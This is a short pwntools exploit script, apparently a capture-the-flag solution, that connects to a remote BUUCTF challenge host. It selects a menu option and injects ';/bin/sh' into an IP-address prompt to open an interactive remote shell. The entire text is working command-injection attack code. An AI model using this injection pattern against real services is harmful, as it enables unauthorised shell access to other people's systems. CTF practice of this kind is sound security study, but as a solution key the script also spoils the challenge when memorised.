from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",27694)

sh.recvuntil(b"Please input u choose:\n")
sh.sendline(b"1")
sh.recvuntil(b"Please input the ip address:\n")
sh.sendline(b";/bin/sh")

sh.interactive()
